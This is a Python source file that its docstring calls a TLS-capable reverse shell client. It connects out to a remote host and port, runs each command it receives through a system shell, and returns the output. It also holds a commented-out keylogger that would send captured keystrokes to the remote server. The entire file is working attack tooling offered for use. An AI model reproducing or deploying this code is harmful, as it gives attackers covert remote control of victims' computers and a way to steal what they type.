#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import argparse
import ssl
import sys
#import pynput.keyboard
"""
Author       - pyCity
Date         - 1/22/2019
Version      - 2.0

Usage:       - python client.py --ssl 127.0.0.1 4444

Description: - Reverse shell in python 3. Has TLS functionality using
             - a DHE-RSA-AES256-SHA256 cipher.
"""


def parse_args():
    """Define host and port variables with optional ssl"""

    parser = argparse.ArgumentParser(description="Python remote tcp client")
    parser.add_argument("host", help="Remote host name to connect to")
    parser.add_argument("port", help="Remote port to connect to", type=int)
    parser.add_argument("--ssl", help="Enable TLS encryption", action="store_true")

    # Array of parsed arguments (host, port, encryption)
    args = parser.parse_args()
    host, port, enc = args.host, args.port, args.ssl
    return host, port, enc



def connect(host, port, enc=False):
    """Create socket object, connect socket to server"""

    s = socket.socket()
    socket.setdefaulttimeout(10)

    # Wait 10 secs if connection isn't successful immediately
    for i in range(10):
        try:
            if enc == True:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                context.set_ciphers('DHE-RSA-AES256-SHA256')
                context.load_dh_params("dhparam.pem")
                context.load_cert_chain("server.crt", "server.key")
                s = context.wrap_socket(s, do_handshake_on_connect=True)
            s.connect((host, port))
            return s

        except:
            time.sleep(5)

# def KeyEvent(event):
#     global strKeyLogs  # List to store logged keys
#
#     try:
#         strKeyLogs # Make sure variable is defined
#     except NameError:
#         strKeyLogs = ""
#
#     if event == Key.backspace:
#         strKeyLogs += "[Back] "
#     elif event == Key.enter:
#         strKeyLogs += "\n"
#     elif event == Key.space:
#         strKeyLogs += " "
#     elif type(event) == Key:
#         strKeyLogs += " [" + str(event)[4:] + "] " # if the character is an unknown special key
#     else:
#         strKeyLogs += str(event)[1:len(str(event)) - 1] # Remove quotes
#
#
# def keylogger(option, s):
#     global strKeyLogs
#
#     if option == "start":
#         if not KeyListener.running:
#             KeyListener.start()
#             s.send(str.encode("Success!"))
#         else:
#             s.send(str.encode("Error!"))
#     elif option == "stop":
#         if KeyListener.running:
#             KeyListener.stop()
#             strKeyLogs = "" # Clear keylog
#             s.send(str.encode("Success!"))
#         else:
#             s.send(str.encode("Error!"))
#     elif option == "dump":
#         if not KeyListener.running:
#             s.send(str.encode("Error!"))
#         else:
#             if strKeyLogs == "":
#                 s.send(str.encode("Error! Nothing to dump"))
#             else:
#                 #s.send(str.encode(str(len(strKeyLogs)))) # Send length of buffer
#                 s.send(str.encode(strKeyLogs)) # Dump keystrokes
#                 strKeyLogs = "" # Clear keys
#
#
# KeyListener = pynput.keyboard.Listener(on_press=KeyEvent)
# Key = pynput.keyboard.Key



def serve_shell(s):
    """Receive commands from remote server and run on local machine"""

    # Standard reverse shell
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8").strip())
        elif data[:4].decode("utf-8").strip() == "kill":
            break
        # elif data[:5].decode("utf-8").strip() == "start":
        #     keylogger("start", s)
        # elif data[:5].decode("utf-8").strip() == "stop":
        #     keylogger("stop", s)
        # elif data[:5].decode("utf-8").strip() == "dump":
        #     keylogger("dump", s)
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
            output = str(bytes_recieved, "utf-8")
            s.send(str.encode(output + str(os.getcwd()) + '#> '))
    s.close()
    sys.exit()



if __name__ == "__main__":
    host, port, enc = parse_args()
    serve_shell(connect(host, port, enc))

